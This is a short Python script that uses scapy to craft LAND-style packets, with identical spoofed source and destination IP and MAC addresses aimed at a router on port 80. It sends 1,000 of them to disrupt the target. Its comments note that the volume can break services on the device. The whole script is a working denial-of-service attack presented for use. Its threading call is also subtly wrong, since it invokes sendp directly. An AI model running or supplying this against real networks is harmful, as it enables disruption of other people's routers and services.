from scapy.all import *
import threading

"""This code is creating the dummy packets and sends from same source to same destination IP address with manipulated mac address"""

"""Here the Wi-fi router IP address = 192.168.0.1 and Mac address: 1c:3b:f3:71:96:d4 as dummy mac address. The scenario is similar to 'Kartik Calling Kartik..' """

# Create the packet object with the parameters
packet = scapy.all.Ether(src = "1c:3b:f3:71:96:d4",dst = "1c:3b:f3:71:96:d4")/scapy.all.IP(src = "192.168.0.1",dst = "192.168.0.1")/scapy.all.TCP(sport =80,dport= 80)

for x in range(1000): #To send 1000 dummy packets(Be careful for this number as it can break the service running on the TCP or UDP ports)
  threadObj = threading.Thread(target=sendp(packet))
  threadObj.start()

